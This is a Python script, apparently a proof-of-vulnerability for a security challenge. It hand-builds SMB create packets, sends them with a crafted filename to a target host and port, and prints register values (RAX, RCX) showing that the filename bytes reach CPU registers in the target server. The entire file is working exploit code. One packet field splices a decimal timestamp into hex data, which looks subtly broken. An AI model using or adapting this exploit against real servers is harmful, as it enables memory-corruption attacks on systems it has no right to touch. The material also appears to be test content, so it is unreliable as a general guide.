import socket
import struct
import sys
import random
import os
import binascii
import time
import select


def smb_com_create(s1, path):

    pid = os.getpid()

    #Protocol
    packet = 'ff'
    packet += '534d42'

    #Command
    packet += '03'

    #Flags1
    packet += '00'

    #Flags2
    packet += '0000'

    #PIDhigh
    #Max PID on server is 32768 = 0x8000 PIDhigh never be nonzero
    packet += '0000'

    #Reserved
    packet += '0000'

    #TreeID
    packet += '0000'

    #PIDlow
    pidLow = "{:04x}".format(pid)

    pidLowBot = pidLow[:len(pidLow) // 2]
    pidLowTop = pidLow[len(pidLow) // 2:]

    pidLow = pidLowTop + pidLowBot
    packet += pidLow

    #UID
    packet += '0000'

    #MID
    packet += '0000'

    #Word Count
    packet += '03'

    #Words
    #FileAttributes
    packet += '1234'

    #CreationTime
    epoch_time = str(int(time.time()))
    print(epoch_time)
    packet += epoch_time 

    #Byte Count
    packet += '0200'

    print(packet + path)
    final_packet = bytes.fromhex(packet) + bytes(path, 'utf-8')

    s1.send(final_packet)

    header = list()
    for i in range(0,24):
        header.append(s1.recv(1).hex())

    print('Header: ' +  str(header))

    #Word Count
    for i in range(0,1):
        word_count = s1.recv(1).hex()

    print('Word Count: ' + str(word_count))

    #Words
    words = list()
    for i in range(0,2):
        words.append(s1.recv(1).hex())
        
    print(str(words))

    #Byte Count
    byte_count = list()
    for i in range(0,2):
        byte_count.append(s1.recv(1).hex())

    print('Byte Count: ' + str(byte_count[::-1]))

    error_code = str(header[8]) +  str(header[7]) + str(header[6]) + str(header[5])
    
    if error_code == '00000000':
        print('RETURN MESSAGE: SUCCESS')
        return 1

    elif error_code == 'c000003b':
        print('RETURN MESSAGE: No path given')
        return 2

    elif error_code == 'c000003e':
        print('RETURN MESSAGE: There was a problem with the access mode')
        return 3

    elif error_code == 'c000000f':
        print('RETURN MESSAGE: The file does not exist')
        return 4

    else:
        print('UNHANDLED MESSAGE ' + error_code)
        return 0

def smb_com_create_new(s1, filename):
    pid = os.getpid()

    #Protocol
    packet = 'ff'
    packet += '534d42'

    #Command
    packet += '0b'

    #Flags1
    packet += '00'

    #Flags2
    packet += '0000'

    #PIDhigh
    #Max PID on server is 32768 = 0x8000 PIDhigh never be nonzero
    packet += '0000'

    #Reserved
    packet += '0000'

    #TreeID
    packet += '0000'

    #PIDlow
    pidLow = "{:04x}".format(pid)

    pidLowBot = pidLow[:len(pidLow) // 2]
    pidLowTop = pidLow[len(pidLow) // 2:]

    pidLow = pidLowTop + pidLowBot
    packet += pidLow

    #UID
    packet += '0000'

    #MID
    packet += '0000'

    #Word Count
    packet += '01'

    #Words
    #FileAttr
    packet += '0000'


    #Byte Count
    packet += '0200'

    print(packet + filename)
    final_packet = bytes.fromhex(packet) + bytes(filename, 'utf-8')

    s1.send(final_packet)

    #Response
    header = list()
    for i in range(0,24):
        header.append(s1.recv(1).hex())

    print('Header: ' + str(header))

    #Word Count
    for i in range(0,1):
        word_count = s1.recv(1).hex()

    print('Word Count: ' + str(word_count))

    words = list()
    for i in range(0,2):
        words.append(s1.recv(1).hex())

    print(str(words))

    #Byte Count
    byte_count = list()
    for i in range(0,2):
        byte_count.append(s1.recv(1).hex())

    print('Byte Count: ' + str(byte_count[::-1]))

    error_code = str(header[8]) +  str(header[7]) + str(header[6]) + str(header[5])
    
    if error_code == '00000000':
        print('RETURN MESSAGE: SUCCESS')
        return 0

    elif error_code == 'c000003b':
        print('RETURN MESSAGE: Failed to create the file')
        return 1

    else:
        print('UNHANDLED MESSAGE ' + error_code)


def start_exploit(HOST, PORT):

    for i in range(0,2):    

        time.sleep(2)
    
        #Connect to the share negotiate and setup
        if i == 0:
            print('\nCREATE_NEW')

            s2 = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)
            s2.connect((HOST,PORT))

            ret_val = smb_com_create_new(s2, '04ABCDEFGHABCD0000.ppm' )

            time.sleep(1)

            s2.close()

        elif i == 1:
            print('\nCREATE')

            s2 = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)
            s2.connect((HOST,PORT))

            ret_val = smb_com_create(s2, '04ABCDEFGHABCD0000.ppm')

            s2.close()

def main():

    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])

    elif 'HOST' in os.environ and 'PORT' in os.environ:
        HOST = os.environ['HOST']
        PORT = int(os.environ['PORT'])

    else:
        print('[ERROR] target and port must be specified via arguments or variables.')
        sys.exit(1)


    if 'SEED' in os.environ:
        SEED = int(os.environ['SEED'])

    else:
        SEED = random.randint(0, 2**64 - 1)

    random.seed(SEED)

    if 'LENGTH' in os.environ:
        LENGTH = int(os.environ['LENGTH'])
    else:
        LENGTH = random.randint(1,1)

    print('SEED={0}'.format(SEED))
    print('LENGTH={0}'.format(LENGTH))

    start_exploit(HOST,PORT)

    print('RAX: 3030303044434241')

    print('RCX: 4847464544434241') 


if __name__ == '__main__':
    main()
